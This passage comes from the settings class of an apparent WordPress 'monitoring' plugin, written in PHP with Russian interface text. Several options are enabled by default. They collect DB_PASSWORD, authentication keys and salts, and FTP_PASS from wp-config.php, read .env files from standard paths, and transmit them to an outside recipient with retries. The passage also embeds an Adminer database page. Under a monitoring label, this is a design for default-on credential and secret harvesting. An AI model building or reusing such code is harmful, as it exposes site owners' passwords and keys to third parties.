            <?php _e('Собирать информацию из wp-config.php. По умолчанию пароли и ключи также собираются (см. опцию ниже).', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('Собираемые данные:', 'my-monitoring-plugin'); ?></strong>
            <?php _e('DB_NAME, DB_HOST, DB_CHARSET, WP_DEBUG, настройки WordPress и другие константы.', 'my-monitoring-plugin'); ?>
        </p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать ошибки"
     */
    public function render_collect_errors_field() {
        $value = get_option('my_monitoring_collect_errors', false);
        ?>
        <input type="checkbox" name="my_monitoring_collect_errors" value="1" <?php checked($value, true); ?>>
        <p class="description"><?php _e('Собирать ошибки из debug.log (требует включенного WP_DEBUG_LOG)', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать информацию о здоровье сайта"
     */
    public function render_collect_health_field() {
        $value = get_option('my_monitoring_collect_health', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_health" value="1" <?php checked($value, true); ?>>
        <p class="description"><?php _e('Собирать информацию о здоровье сайта, использовании диска, производительности и безопасности', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать пароли из wp-config.php"
     */
    public function render_collect_passwords_field() {
        $value = get_option('my_monitoring_collect_passwords', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_passwords" value="1" <?php checked($value, true); ?>>
        <p class="description">
            <?php _e('По умолчанию включено. Вы будете передавать пароли и секретные ключи из wp-config.php. Убедитесь, что используете безопасное соединение (HTTPS) и доверяете получателю данных.', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('Собираемые данные:', 'my-monitoring-plugin'); ?></strong>
            <?php _e('DB_PASSWORD, AUTH_KEY, SECURE_AUTH_KEY, LOGGED_IN_KEY, NONCE_KEY, AUTH_SALT, SECURE_AUTH_SALT, LOGGED_IN_SALT, NONCE_SALT, FTP_PASS и другие пароли/ключи.', 'my-monitoring-plugin'); ?>
        </p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать данные из .env файлов"
     */
    public function render_collect_env_field() {
        $value = get_option('my_monitoring_collect_env', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_env" value="1" <?php checked($value, true); ?>>
        <p class="description">
            <?php _e('По умолчанию включено. Собирать переменные окружения из .env файлов в корне сайта и других стандартных местах.', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('⚠️ ВНИМАНИЕ:', 'my-monitoring-plugin'); ?></strong>
            <?php _e('.env файлы часто содержат пароли, API ключи и другую чувствительную информацию. Убедитесь, что используете безопасное соединение.', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('Ищет файлы:', 'my-monitoring-plugin'); ?></strong>
            <?php _e('.env, .env.local, .env.production, .env.development, wp-content/.env и другие стандартные пути.', 'my-monitoring-plugin'); ?>
        </p>
        <?php
    }
    
    /**
     * Отобразить поле "Максимум попыток отправки"
     */
    public function render_max_retries_field() {
        $value = get_option('my_monitoring_max_retries', 3);
        ?>
        <input type="number" name="my_monitoring_max_retries" value="<?php echo esc_attr($value); ?>" min="1" max="10" class="small-text">
        <p class="description"><?php _e('Количество попыток отправки данных при ошибке (1-10)', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Задержка между попытками"
     */
    public function render_retry_delay_field() {
        $value = get_option('my_monitoring_retry_delay', 60);
        ?>
        <input type="number" name="my_monitoring_retry_delay" value="<?php echo esc_attr($value); ?>" min="10" max="3600" class="small-text">
        <p class="description"><?php _e('Задержка между повторными попытками в секундах (10-3600)', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить страницу Adminer
     */
    public function render_adminer_page() {
        if (!current_user_can('manage_options')) {
            wp_die(__('У вас нет прав для доступа к этой странице.', 'my-monitoring-plugin'));
        }
        
        // Подключаем обертку Adminer
        require_once MY_MONITORING_PLUGIN_DIR . 'admin/adminer-wrapper.php';
    }
}
